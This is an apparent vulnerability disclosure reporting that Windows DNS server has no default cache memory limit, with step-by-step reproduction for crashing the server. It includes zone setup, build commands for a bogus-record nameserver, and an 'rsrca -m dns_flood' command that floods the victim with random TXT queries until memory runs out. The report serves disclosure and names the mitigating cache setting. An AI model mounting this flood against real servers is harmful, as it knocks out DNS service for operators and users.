# MSCVD: MS DNS has no cache memory limit
 - Type: Denial of Service (CWE-400: Uncontrolled Resource Consumption)
 - Attack vector: MS DNS

Windows DNS server has no default cache memory limit. `Set-DnsServerCache`[^1]
or `dnscmd /maxcachesize`[^2](for older versions) can be used to limit the cache
memory use, but this setting is

 1. not well known
 2. not exposed in the GUI

A malicious actor can exploit these facts to fill up the DNS cache with garbage
to exhaust system memory to cause an eventual system crash.

## Steps to Reproduce
Prerequisites:

 1. a domain name (for demonstration purposes, `example.com` is used in this
    report)
 2. a Linux machine with public IP address for hosting the special nameserver
    implementation `rsrca-ns`(attached in the POC bundle)
 3. another Linux machine for running `rsrca`
 4. The victim Windows server

The Windows server and rsrca machine(3) will need IPv6 connectivity as the
`rsrca` program only supports IPv6. In theory, the IP version involved should
have no impact on the result.

**rsrca-ns** is a simple nameserver implementation specifically written for the
POC. It returns random bogus records. It can be used to fill the DNS cache with
random data.

### Victim Windows server setup
https://learn.microsoft.com/en-us/windows-server/networking/dns/quickstart-install-configure-dns-server?tabs=powershell#installing-dns-server

Install and start DNS service as per instructions above. The
`Get-DnsServerCache` command should report `MaxKBSize` as zero.

### rsrca-ns machine setup
Via the domain registrar, delegate the zone to the server.

```zone
$ORIGIN example.com.
$TTL 3600
example.com.	IN	NS		ns
ns				IN	A		192.0.2.1
ns				IN	AAAA	2001:db8::53:1
```

where `192.0.2.1` and `2001:db8::53:1` are the IP address of the server running
rsrca-ns.

Build and run rsrca-ns:

 1. untar the POC bundle and cd to the directory
 2. configure: `cmake --config Release -B build .`
 3. cd to the build directory: `cd build`
 4. build rsrca-ns: `make rsrca-ns`
 5. run in background: `sudo ./rsrca-ns &`

To kill the process, use `sudo killall rsrca-ns`.

Test if public resolvers can reach rsrca-ns:

```sh
for (( i = 0; i < 5; i += 1 )); do dig +short $RANDOM.example.com A; done
#168.103.224.107
#236.125.181.89
#247.62.94.26
#167.215.119.33
#27.38.239.66

for (( i = 0; i < 5; i += 1 )); do dig +short $RANDOM.example.com AAAA; done
#f1d8:ae62:d4e8:2445:c2d9:317a:3a8e:cf5e
#77b2:820c:ba9:9258:9b3e:9804:7834:3627
#64c6:ae57:35fc:6213:8405:9c47:d641:2e54
#c773:e428:ca22:6d2e:9513:77f:5adc:9629
#aae:5c6f:a44b:a62d:6613:b000:e48d:c927

for (( i = 0; i < 5; i += 1 )); do dig +short $RANDOM.example.com TXT; done
#"m$y SyZQ?SK&|R_6_Zy$l}7?`*POu!`m2\\7E"
#"B7h*'97#?3C:}P+`>a)W'K'yLzG?)XP\"2'z~sx>}iCJM+WLz U ED^%F^sNrNJ<QGYS:\\Mr#(z.>N^ON>e'M/?3M[>=4Oqw/a6R^pEe$y&nw'L<@ZCaGZ#.];a4mA3E_Ej?k`d MYP'#)5=~nB;uJs( &gW|y&a.~w#@;6m&]#0,Ny60?0#!Pu,>(}1/ e3(u .>"
#"n>!2Y/~Z?8UEqh"
#"T=^CS`;4c|R-O\"oP[%E@t&^i}M-Wij-48)Bq6P=/`Jq;vQZ&d~T/c]*+8BX7mSX9C(Eq4tW/~CCo30u!4iQ/X*gF{Jc/#wd0fFA/-x1;0rAA/jS2h?rz=9;Z3L4S[nkKd.K6_=B,Uh!*2 ;EK|F=C6W"
#"ypu!xyD@..8/0#[q:K JA/-2=*Nar'-'&(rv\"B_QJ9ex7_I>vT44XXJhExd=)C(h3aRF?49*X$2qf@FrNY 7aZ|=)\\AbDTXm:aT/N7p,6Gis[W3}ZKNPO%*\"!\\+ykRi1v%X$X"
```

### rsrca machine setup
Build and run rsrca-ns:

 1. untar the POC bundle and cd to the directory
 2. configure: `cmake --config Release -B build .`
 3. cd to the build directory: `cd build`
 4. build rsrca-ns: `make rsrca`

Mount the attack:

```sh
sudo ./rsrca -m dns_flood -R example.com -w 2001:db8:1::1 2001:db8:2::1
```

where `2001:db8:1::1` is the address of the host running rsrca, `2001:db8:2::1`
is the address of the victim Windows server.

Crafted DNS queries(`1234.example.com TXT`, `5678.example.com TXT`, ...) will be
sent to the victim server. The victim server will then get random TXT RDATA from
rsrca-ns. Over the span of hours, the memory utilisation of dns.exe process will
slowly creep up, to the point where the system runs out of virtual address space
and crashes.

For the attack to be effective, all of the servers involved should preferably
be in close network proximity.


---

[^1]: https://learn.microsoft.com/en-us/powershell/module/dnsserver/set-dnsservercache?view=windowsserver2025-ps
[^2]: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd#dnscmd-config-command
